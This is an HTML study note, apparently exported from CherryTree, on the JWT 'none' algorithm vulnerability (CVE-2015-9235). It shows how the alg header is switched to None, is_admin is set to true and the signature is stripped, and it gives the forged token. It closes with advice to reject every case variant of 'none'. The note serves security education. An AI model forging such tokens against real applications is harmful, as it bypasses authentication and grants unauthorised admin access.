<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>'none' Algorithm (CVE-2015-9235)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>'none' Algorithm (CVE-2015-9235)</h1><br/><strong><h3>The JWT format</h3></strong><br />A JSON Web Token consists of a header, payload, and signature in base64url encoding, separated by dots, as follows:<br /><code>HEADER.PAYLOAD.SIGNATURE</code><br />Let’s take apart the following real token:<br /><div class="codebox"><pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<br />eyJuYW1lIjoiSm9obiBEb2UiLCJ1c2VyX25hbWUiOiJqb2huLmRvZSIsImlzX2FkbWluIjpmYWxzZX0.<br />fSppjHFaqlNcpK1Q8VudRD84YIuhqFfA67XkLam0_aY</pre></div><br /><br /><br /><br /><br /><strong>Attack using none algorithm</strong><br />The JWT standard accepts many different types of algorithms to generate a signature:<br />• RSA<br />• HMAC<br />• Elliptic Curve <br />• None<br /><br />The None algorithm specifies that the token is not signed. If this algorithm is permitted, we can bypass signature checking by changing an existing algorithm to None and stripping the signature. Let’s start with our expected token:<br /><div class="codebox"><pre>{<br />  &quot;alg&quot;: &quot;HS256&quot;,<br />  &quot;typ&quot;: &quot;JWT&quot; <br />}.<br />{<br />  &quot;name&quot;: &quot;John Doe&quot;,<br />  &quot;user_name&quot;: &quot;john.doe&quot;,<br />  &quot;is_admin&quot;: false<br />}.SIGNATURE</pre></div><br /><br /><br />Encoded and signed, the token will look like this:<br /><div class="codebox"><pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<br />eyJuYW1lIjoiSm9obiBEb2UiLCJ1c2VyX25hbWUiOiJqb2huLmRvZSIsImlzX2FkbWluIjpmYWxzZX0.<br />fSppjHFaqlNcpK1Q8VudRD84YIuhqFfA67XkLam0_aY</pre></div><br /><br /><strong><h3>Vulnerability</h3></strong><br /><br />If <span style="text-decoration:underline;">None</span> is permitted as the algorithm value, an attacker can simply use it to replace the valid algorithm and then get rid of the signature:<br /><div class="codebox"><pre>{<br />  &quot;alg&quot;: &quot;None&quot;,<br />  &quot;typ&quot;: &quot;JWT&quot;<br />}.<br />{<br />  &quot;name&quot;: &quot;John Doe&quot;,<br />  &quot;user_name&quot;: &quot;john.doe&quot;,<br />  &quot;is_admin&quot;: true<br />}.</pre></div><br />First we will: Base64URL encode the <code>HEADER</code> + “.” + Base64URL encode the <code>PAYLOAD</code> + “.”<br /><br /><br />Though now unsigned, the modified token will be accepted by the application:<br /><div class="codebox"><pre>eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.<br />eyJuYW1lIjoiSm9obiBEb2UiLCJ1c2VyX25hbWUiOiJqb2huLmRvZSIsImlzX2FkbWluIjp0cnVlfQ.That is why it is important to not accept tokens with None, none, NONE, nOnE, or any other case variations in the alg header.</pre></div><br /><br /><br /><br /><br /><br /><br />Bibliography:<br /><a href="https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/">https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/</a></div>
</body>
</html>
